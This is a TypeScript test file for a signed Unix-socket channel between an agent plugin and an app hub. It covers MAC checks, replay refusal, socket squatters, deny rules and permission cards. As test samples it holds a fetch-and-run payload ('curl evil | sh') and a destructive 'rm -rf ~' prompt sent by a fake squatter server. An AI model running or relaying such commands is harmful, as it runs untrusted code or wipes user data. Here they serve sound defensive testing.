// The channel end to end (MIP2-1390): the mod's own client code
// (mod/hooks/channel.ts) against the app's hub and server, over real Unix
// sockets. `$` is stood in by a clock and an http.fetch that speaks over a
// socket, the two engine calls the client makes.

import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync } from 'node:fs'
import { createServer, request } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { channelCall, channelFrom, channelHello, channelSend, type Channel, type ChannelEngine } from '../../../mod/hooks/channel.ts'
import { ANSWER_CHARS, CHANNEL_PATHS, HEADER, requestText, type PermissionAsk } from '../../../mod/hooks/channel-wire.ts'
import { ChannelHub } from '../src/channel/hub.ts'
import { newSecret, sign } from '../src/channel/crypto.ts'
import { ChannelServer } from '../src/channel/server.ts'

const A_TEXT = readFileSync(new URL('./fixtures/reporter-2.1.311-scratch-a.json', import.meta.url), 'utf8')
const A_ID = 'c0ffee05-0000-4000-8000-000000000005'

interface RawReply {
  status: number
  text: string
  headers: Record<string, string>
}

function rawRequest(socketPath: string, method: string, path: string, headers: Record<string, string>, chunks: Buffer[] = []): Promise<RawReply> {
  return new Promise((resolve, reject) => {
    const req = request({ socketPath, method, path, headers }, res => {
      const parts: Buffer[] = []
      res.on('data', c => parts.push(c))
      res.on('end', () =>
        resolve({
          status: res.statusCode ?? 0,
          text: Buffer.concat(parts).toString('utf8'),
          headers: Object.fromEntries(Object.entries(res.headers).map(([k, v]) => [k, String(v)])),
        }),
      )
    })
    req.on('error', reject)
    for (const c of chunks) req.write(c)
    req.end()
  })
}

/** The engine calls the mod's channel client makes, over a real socket. */
function fakeEngine(): ChannelEngine {
  return {
    clock: { now: async () => Date.now() },
    http: {
      fetch: async (_url: string, init: { method: string; headers: Record<string, string>; body?: string; socketPath: string }) => {
        const path = new URL(_url).pathname
        return rawRequest(init.socketPath, init.method, path, init.headers, init.body ? [Buffer.from(init.body)] : [])
      },
    },
  }
}

function settingsOf(path: string) {
  return JSON.parse(readFileSync(path, 'utf8')) as {
    pluginConfigs: Record<string, { options: { socketPath: string; secret: string; channelRoot: string } }>
    permissions: { deny: string[] }
  }
}

function signedHeaders(secret: string, method: string, path: string, body: string, over: Partial<Record<string, string>> = {}) {
  const nonce = over.nonce ?? newSecret().slice(0, 32)
  const ts = over.ts ?? String(Date.now())
  return {
    'content-type': 'application/json',
    [HEADER.nonce]: nonce,
    [HEADER.ts]: ts,
    [HEADER.mac]: over.mac ?? sign(secret, requestText(method, path, nonce, ts, body)),
  }
}

const ASK: PermissionAsk = {
  requestId: '6f1c2a9e-1111-4c3d-8e9f-0a1b2c3d4e5f',
  toolUseId: 'toolu_1',
  agentId: null,
  tool: 'Bash',
  input: { command: 'mkdir -p /tmp/x', description: 'Make a folder' },
  questions: null,
  canRemember: true,
}

describe('ChannelHub', () => {
  let base: string
  let hub: ChannelHub
  let $: ChannelEngine
  const logs: string[] = []

  const answers: { id: string; at: number }[] = []
  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'ccc-')))
    answers.length = 0
    hub = new ChannelHub({ modDir: '/mod', root: join(base, 'ch'), longPollMs: 300, log: l => logs.push(l), onAnswer: (id, post) => answers.push({ id, at: post.at }) })
    $ = fakeEngine()
    logs.length = 0
  })
  afterEach(async () => {
    await hub.closeAll()
    rmSync(base, { recursive: true, force: true })
  })

  async function launch(): Promise<{ id: string; settings: ReturnType<typeof settingsOf>; ch: Channel; socketPath: string; secret: string }> {
    const l = await hub.prepareLaunch()
    const settings = settingsOf(l.settingsPath)
    const opts = settings.pluginConfigs['ccc-reporter@inline']!.options
    return { id: l.channelId, settings, ch: channelFrom(opts)!, socketPath: opts.socketPath, secret: opts.secret }
  }

  it('writes "ultracode": true only when asked (MIP2-1407)', async () => {
    const on = await hub.prepareLaunch({ ultracode: true })
    const off = await hub.prepareLaunch()
    expect((settingsOf(on.settingsPath) as { ultracode?: boolean }).ultracode).toBe(true)
    expect('ultracode' in (settingsOf(off.settingsPath) as object)).toBe(false)
  })

  it('prepares a private folder, a 0600 settings file, deny rules on the whole root, and no secret in the arguments', async () => {
    const l = await hub.prepareLaunch()
    const dir = join(hub.root, l.channelId)
    expect(lstatSync(dir).mode & 0o777).toBe(0o700)
    expect(lstatSync(hub.root).mode & 0o777).toBe(0o700)
    expect(lstatSync(l.settingsPath).mode & 0o777).toBe(0o600)
    const s = settingsOf(l.settingsPath)
    const opts = s.pluginConfigs['ccc-reporter@inline']!.options
    expect(opts.secret).toMatch(/^[0-9a-f]{64}$/)
    expect(opts.socketPath).toBe(join(dir, 's.sock'))
    expect(Buffer.byteLength(opts.socketPath)).toBeLessThanOrEqual(100)
    expect(lstatSync(opts.socketPath).mode & 0o777).toBe(0o600)
    expect(s.permissions.deny).toContain(`Read(/${hub.root}/**)`)
    expect(s.permissions.deny).toContain(`Edit(/${hub.root}/**)`)
    // The mod's folder too, so a session can't change every session's mod (gate M-2).
    expect(s.permissions.deny).toEqual(expect.arrayContaining(['Read(//mod/**)', 'Edit(//mod/**)']))
    // With a mod root, every version's folder is denied (gate run 2, L-1).
    const rooted = new ChannelHub({ modDir: '/data/reporter-mod/abc', modRoot: '/data/reporter-mod', root: join(base, 'ch2'), log: () => {} })
    const r = settingsOf((await rooted.prepareLaunch()).settingsPath)
    expect(r.permissions.deny).toEqual(expect.arrayContaining(['Read(//data/reporter-mod/**)', 'Edit(//data/reporter-mod/**)']))
    await rooted.closeAll()
    expect(l.args).toEqual(['--plugin-dir', '/mod', '--settings', l.settingsPath])
    expect(l.args.join(' ')).not.toContain(opts.secret)
  })

  it('makes a new secret for every launch', async () => {
    const a = await launch()
    const b = await launch()
    expect(a.secret).not.toBe(b.secret)
    expect(a.id).not.toBe(b.id)
  })

  it('answers the hello and takes telemetry, bound to the first sessionId', async () => {
    const { ch } = await launch()
    expect(await channelHello($, ch)).toBe(true)
    const file = JSON.parse(A_TEXT)
    expect((await channelCall($, ch, 'POST', CHANNEL_PATHS.report, file))?.status).toBe(204)
    expect([...hub.readReporter().files.keys()]).toEqual([A_ID])
    expect(hub.channelOf(A_ID)).not.toBeNull()
    // A report for another session on this channel is refused.
    const other = { ...file, sessionId: '00000000-0000-4000-8000-000000000000' }
    expect(await channelCall($, ch, 'POST', CHANNEL_PATHS.report, other)).toBeUndefined()
    expect([...hub.readReporter().files.keys()]).toEqual([A_ID])
  })

  it('refuses a report that fails the schema', async () => {
    const { ch } = await launch()
    expect(await channelCall($, ch, 'POST', CHANNEL_PATHS.report, { wire: 0 })).toBeUndefined()
    expect(hub.readReporter().files.size).toBe(0)
  })

  it('holds a permission request until the app answers it', async () => {
    const { ch } = await launch()
    await channelCall($, ch, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    const poll = channelCall($, ch, 'POST', CHANNEL_PATHS.permission, ASK)
    await new Promise(r => setTimeout(r, 50))
    const pending = hub.pendingRequests().get(A_ID)
    expect(pending?.map(p => [p.requestId, p.tool, p.summary, p.canRemember])).toEqual([[ASK.requestId, 'Bash', 'mkdir -p /tmp/x', true]])
    expect(hub.answer(ASK.requestId, { verdict: 'allow', remember: true })).toBe(true)
    expect((await poll)?.body).toEqual({ status: 'answer', verdict: 'allow', remember: true })
    expect(hub.pendingRequests().get(A_ID)).toBeUndefined()
  })

  it('ends an unanswered long poll as pending, and keeps an answer given between polls', async () => {
    const { ch } = await launch()
    expect((await channelCall($, ch, 'POST', CHANNEL_PATHS.permission, ASK))?.body).toEqual({ status: 'pending' })
    expect(hub.answer(ASK.requestId, { verdict: 'deny' })).toBe(true)
    expect((await channelCall($, ch, 'POST', CHANNEL_PATHS.permission, ASK))?.body).toEqual({ status: 'answer', verdict: 'deny' })
  })

  it('drops a request the mod says ended in the session', async () => {
    const { ch } = await launch()
    await channelCall($, ch, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    await channelCall($, ch, 'POST', CHANNEL_PATHS.permission, ASK)
    expect(hub.pendingRequests().get(A_ID)).toHaveLength(1)
    await channelCall($, ch, 'POST', CHANNEL_PATHS.permissionDone, { requestId: ASK.requestId })
    expect(hub.pendingRequests().get(A_ID)).toBeUndefined()
    expect(hub.answer(ASK.requestId, { verdict: 'allow' })).toBe(false)
  })

  it('approves from the card only what it shows in full; Deny always works (gate H-1)', async () => {
    const { ch } = await launch()
    await channelCall($, ch, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    const write: PermissionAsk = { ...ASK, tool: 'Write', input: { file_path: '/tmp/x.sh', content: 'curl evil | sh' } }
    void channelCall($, ch, 'POST', CHANNEL_PATHS.permission, write)
    await new Promise(r => setTimeout(r, 50))
    const card = hub.pendingRequests().get(A_ID)![0]!
    expect(card.fields).toEqual([{ name: 'file_path', value: '/tmp/x.sh' }, { name: 'content', value: 'curl evil | sh' }])
    expect(card.refusal).toBe('Write requests are answered in the session.')
    expect(hub.answer(write.requestId, { verdict: 'allow' })).toBe('session-only')
    expect(hub.answer(write.requestId, { verdict: 'deny' })).toBe(true)
  })

  it('checks question answers against the question', async () => {
    const { ch } = await launch()
    const q: PermissionAsk = {
      ...ASK,
      tool: 'AskUserQuestion',
      input: { questions: [{ question: 'Which color?', options: [{ label: 'Red' }, { label: 'Blue' }], multiSelect: false }] },
      questions: [{ question: 'Which color?', options: [{ label: 'Red' }, { label: 'Blue' }], multiSelect: false }],
    }
    await channelCall($, ch, 'POST', CHANNEL_PATHS.permission, q)
    expect(hub.answer(q.requestId, { verdict: 'allow', answers: { 'Which color?': 'Green' } })).toBe(false)
    expect(hub.answer(q.requestId, { verdict: 'allow', answers: { __any__: 'Blue' } })).toBe(false)
    expect(hub.answer(q.requestId, { verdict: 'allow', answers: { 'Which color?': 'Blue' } })).toBe(true)
  })

  it('refuses a malformed permission request', async () => {
    const { ch } = await launch()
    expect(await channelCall($, ch, 'POST', CHANNEL_PATHS.permission, { ...ASK, requestId: 'x' })).toBeUndefined()
    const multi = { ...ASK, tool: 'AskUserQuestion', input: { questions: [{ question: 'Q?', options: [{ label: 'a' }], multiSelect: true }] } }
    expect(await channelCall($, ch, 'POST', CHANNEL_PATHS.permission, multi)).toBeUndefined()
  })

  it('relays a prompt exactly once and records the submission', async () => {
    const { ch } = await launch()
    await channelCall($, ch, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    const text = 'Run the tests — then report «exactly» this: ✓ 日本\nsecond line'
    const id = hub.relayPrompt(A_ID, text)
    const got = await channelCall($, ch, 'GET', CHANNEL_PATHS.prompt)
    expect(got?.body).toEqual({ id, text })
    expect(hub.promptStatus(A_ID).map(p => p.state)).toEqual(['delivered'])
    expect((await channelCall($, ch, 'GET', CHANNEL_PATHS.prompt))?.status).toBe(204)
    await channelCall($, ch, 'POST', CHANNEL_PATHS.promptAck, { id })
    expect(hub.promptStatus(A_ID).map(p => p.state)).toEqual(['submitted'])
  })

  it("keeps the session's latest whole answer, and refuses one past the cap (mod 0.6.0)", async () => {
    const { ch } = await launch()
    await channelCall($, ch, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    expect(hub.lastAnswer(A_ID)).toBeNull()
    const text = '# Done\n\n- one\n- two ✓ 日本'
    expect((await channelCall($, ch, 'POST', CHANNEL_PATHS.answer, { at: 20, text }))?.status).toBe(204)
    // An older one arriving late doesn't replace it.
    await channelCall($, ch, 'POST', CHANNEL_PATHS.answer, { at: 10, text: 'older' })
    expect(hub.lastAnswer(A_ID)).toEqual({ at: 20, text })
    expect(await channelCall($, ch, 'POST', CHANNEL_PATHS.answer, { at: 30, text: 'x'.repeat(ANSWER_CHARS + 1) })).toBeUndefined()
    expect(await channelCall($, ch, 'POST', CHANNEL_PATHS.answer, { at: 'soon', text })).toBeUndefined()
    expect(hub.lastAnswer(A_ID)?.at).toBe(20)
    // Each newer answer goes on to the card summaries (MIP2-1422); the late older one doesn't.
    expect(answers).toEqual([{ id: A_ID, at: 20 }])
  })

  it('asks a mod for its whole report while the channel has none', async () => {
    const { ch } = await launch()
    expect((await channelCall($, ch, 'GET', CHANNEL_PATHS.prompt))?.body).toEqual({ want: 'report' })
    await channelCall($, ch, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    expect((await channelCall($, ch, 'GET', CHANNEL_PATHS.prompt))?.status).toBe(204)
  })

  it('wakes a waiting prompt poll when a prompt is queued', async () => {
    const { ch } = await launch()
    await channelCall($, ch, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    const poll = channelCall($, ch, 'GET', CHANNEL_PATHS.prompt)
    await new Promise(r => setTimeout(r, 50))
    const id = hub.relayPrompt(A_ID, 'hello')
    expect((await poll)?.body).toEqual({ id, text: 'hello' })
  })

  it('recovers a channel after the app restarts, and close removes it', async () => {
    const { id, ch } = await launch()
    await hub.closeAll()
    const again = new ChannelHub({ modDir: '/mod', root: hub.root, longPollMs: 300, log: () => {} })
    expect(await again.recover()).toEqual([id])
    expect(await channelHello($, ch)).toBe(true)
    await again.close(id)
    expect(existsSync(join(hub.root, id))).toBe(false)
    expect(await channelHello($, ch)).toBe(false)
  })

  it('with card answers off, cancels offers, hides them and refuses answers; with the relay off, refuses prompts', async () => {
    const { ch } = await launch()
    await channelCall($, ch, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    const poll = channelCall($, ch, 'POST', CHANNEL_PATHS.permission, ASK)
    await new Promise(r => setTimeout(r, 50))
    hub.setControl(['card-answers', 'prompt-relay'])
    expect((await poll)?.body).toEqual({ status: 'cancel' })
    expect((await channelCall($, ch, 'POST', CHANNEL_PATHS.permission, ASK))?.body).toEqual({ status: 'cancel' })
    expect(hub.pendingRequests().size).toBe(0)
    expect(hub.answer(ASK.requestId, { verdict: 'allow' })).toBe(false)
    expect(() => hub.relayPrompt(A_ID, 'hi')).toThrow('switched off')
    hub.setControl([])
    expect(() => hub.relayPrompt(A_ID, 'hi')).not.toThrow()
  })

  it('drops an offer its mod stopped polling for (a respawn ended the wait)', async () => {
    let t = Date.now()
    const timed = new ChannelHub({ modDir: '/mod', root: join(base, 'ch2'), longPollMs: 50, now: () => t, log: () => {} })
    const l = await timed.prepareLaunch()
    const opts = settingsOf(l.settingsPath).pluginConfigs['ccc-reporter@inline']!.options
    const c = channelFrom(opts)!
    await channelCall($, c, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    await channelCall($, c, 'POST', CHANNEL_PATHS.permission, ASK)
    expect(timed.pendingRequests().get(A_ID)).toHaveLength(1)
    t += 41_000
    expect(timed.pendingRequests().get(A_ID)).toBeUndefined()
    expect(timed.health()[0]).toMatchObject({ sessionId: A_ID, launched: true, offered: 1 })
    await timed.closeAll()
  })

  it('records the bound session in the channel folder, so recovery knows it', async () => {
    const { id, ch } = await launch()
    await channelCall($, ch, 'POST', CHANNEL_PATHS.report, JSON.parse(A_TEXT))
    await new Promise(r => setTimeout(r, 20))
    await hub.closeAll()
    const again = new ChannelHub({ modDir: '/mod', root: hub.root, log: () => {} })
    await again.recover()
    expect(again.health().find(h => h.sessionId === A_ID)).toMatchObject({ launched: false, contactAt: 0 })
    await again.closeAll()
    expect(id).toMatch(/^[0-9a-f]{8}$/)
  })

  describe('refusals', () => {
    it('a mod with the wrong secret gets no answer, and the app never takes its request', async () => {
      const { socketPath } = await launch()
      const impostor = channelFrom({ socketPath, secret: newSecret(), channelRoot: hub.root })!
      expect(await channelHello($, impostor)).toBe(false)
      expect(await channelCall($, impostor, 'POST', CHANNEL_PATHS.permission, ASK)).toBeUndefined()
      expect(hub.pendingRequests().size).toBe(0)
      expect(logs.some(l => l.includes('bad mac'))).toBe(true)
    })

    it('a squatter on the socket fails the hello, so the mod sends no request and leaves the dialog', async () => {
      const dir = mkdtempSync(join(base, 'sq-'))
      const socketPath = join(dir, 's.sock')
      const seen: string[] = []
      // Answers "allow" to everything, signing with a key that isn't the session's.
      const squatter = new ChannelServer({
        socketPath,
        secret: newSecret(),
        handlers: {
          report: () => {},
          permission: async ask => (seen.push(ask.requestId), { status: 'answer', verdict: 'allow' }),
          permissionDone: () => {},
          nextPrompt: async () => ({ id: 'x', text: 'rm -rf ~' }),
          promptAck: () => {},
        },
      })
      await squatter.listen()
      const mod = channelFrom({ socketPath, secret: newSecret(), channelRoot: base })!
      expect(await channelHello($, mod)).toBe(false)
      expect(await channelCall($, mod, 'GET', CHANNEL_PATHS.prompt)).toBeUndefined()
      expect(seen).toEqual([])
      await squatter.close()
    })

    it('after a failure, content goes out only once the app has proven the secret again', async () => {
      const { id, ch, socketPath } = await launch()
      expect((await channelSend($, ch, CHANNEL_PATHS.report, JSON.parse(A_TEXT)))?.status).toBe(204)
      expect(ch.trusted).toBe(true)
      // The app goes down and another process takes the socket. It reads
      // everything sent to it and answers with no valid MAC.
      await hub.close(id)
      mkdirSync(join(hub.root, id), { mode: 0o700 })
      const seen: { path: string; bytes: number }[] = []
      const squatter = createServer((req, res) => {
        const parts: Buffer[] = []
        req.on('data', c => parts.push(c))
        req.on('end', () => {
          seen.push({ path: req.url ?? '', bytes: Buffer.concat(parts).length })
          res.writeHead(200, { [HEADER.mac]: 'f'.repeat(64) }).end('{"ok":true}')
        })
      })
      await new Promise<void>(r => squatter.listen(socketPath, () => r()))
      for (let i = 0; i < 4; i++) expect(await channelSend($, ch, CHANNEL_PATHS.permission, ASK)).toBeUndefined()
      // The one call made while the channel was still trusted reaches it;
      // every later call is an empty hello that fails.
      expect(seen[0]).toMatchObject({ path: CHANNEL_PATHS.permission })
      expect(seen.slice(1)).toEqual(Array(3).fill({ path: CHANNEL_PATHS.hello, bytes: 0 }))
      await new Promise<void>(r => squatter.close(() => r()))
    })

    it('a forged MAC, a replay, a stale or malformed timestamp, a bad nonce and an unknown route are refused', async () => {
      const { socketPath, secret } = await launch()
      const path = CHANNEL_PATHS.hello
      const ok = signedHeaders(secret, 'POST', path, '')
      expect((await rawRequest(socketPath, 'POST', path, ok)).status).toBe(200)
      expect((await rawRequest(socketPath, 'POST', path, ok)).status).toBe(401)
      const cases: Record<string, string>[] = [
        signedHeaders(secret, 'POST', path, '', { mac: 'f'.repeat(64) }),
        signedHeaders(secret, 'POST', path, '', { mac: 'zz' }),
        signedHeaders(secret, 'POST', path, '', { ts: String(Date.now() - 120_000) }),
        signedHeaders(secret, 'POST', path, '', { ts: String(Date.now() + 120_000) }),
        signedHeaders(secret, 'POST', path, '', { ts: 'NaN' }),
        signedHeaders(secret, 'POST', path, '', { ts: '1e3' }),
        signedHeaders(secret, 'POST', path, '', { nonce: 'X'.repeat(32) }),
        signedHeaders(secret, 'POST', path, '', { nonce: 'ab' }),
      ]
      for (const h of cases) expect((await rawRequest(socketPath, 'POST', path, h)).status).toBe(401)
      expect((await rawRequest(socketPath, 'GET', path, signedHeaders(secret, 'GET', path, ''))).status).toBe(401)
      expect((await rawRequest(socketPath, 'POST', '/v1/other', signedHeaders(secret, 'POST', '/v1/other', ''))).status).toBe(401)
      expect((await rawRequest(socketPath, 'POST', `${path}?x=1`, signedHeaders(secret, 'POST', `${path}?x=1`, ''))).status).toBe(401)
    })

    it('a request signed before the server started is refused', async () => {
      const { socketPath, secret } = await launch()
      const path = CHANNEL_PATHS.hello
      const h = signedHeaders(secret, 'POST', path, '', { ts: String(Date.now() - 5_000) })
      expect((await rawRequest(socketPath, 'POST', path, h)).status).toBe(401)
    })

    it('a reply is signed with the request nonce, so it verifies only for that request', async () => {
      const { socketPath, secret } = await launch()
      const path = CHANNEL_PATHS.hello
      const h = signedHeaders(secret, 'POST', path, '')
      const r = await rawRequest(socketPath, 'POST', path, h)
      expect(r.headers[HEADER.mac]).toBe(sign(secret, `rep\n${h[HEADER.nonce]}\n200\n${r.text}`))
      expect(r.headers[HEADER.mac]).not.toBe(sign(secret, `rep\n${'0'.repeat(32)}\n200\n${r.text}`))
    })

    it('a body split inside a multibyte character still verifies', async () => {
      const { socketPath, secret } = await launch()
      const body = JSON.stringify({ requestId: ASK.requestId, note: '日本語✓' })
      const bytes = Buffer.from(body, 'utf8')
      const cut = bytes.indexOf(Buffer.from('本')) + 1
      const path = CHANNEL_PATHS.permissionDone
      const r = await rawRequest(socketPath, 'POST', path, signedHeaders(secret, 'POST', path, body), [bytes.subarray(0, cut), bytes.subarray(cut)])
      expect(r.status).toBe(204)
    })
  })
})

describe('channelFrom', () => {
  it.each([
    [{ socketPath: '/r/a/s.sock', secret: 'a'.repeat(64), channelRoot: '/r' }, true],
    [{ socketPath: '/r/a/s.sock', secret: 'A'.repeat(64), channelRoot: '/r' }, false],
    [{ socketPath: '/r/a/s.sock', secret: 'a'.repeat(32), channelRoot: '/r' }, false],
    [{ socketPath: 'rel/s.sock', secret: 'a'.repeat(64), channelRoot: 'rel' }, false],
    [{ socketPath: '/other/s.sock', secret: 'a'.repeat(64), channelRoot: '/r' }, false],
    [{}, false],
  ])('%o → %s', (opts, ok) => {
    expect(channelFrom(opts) !== null).toBe(ok)
  })
})
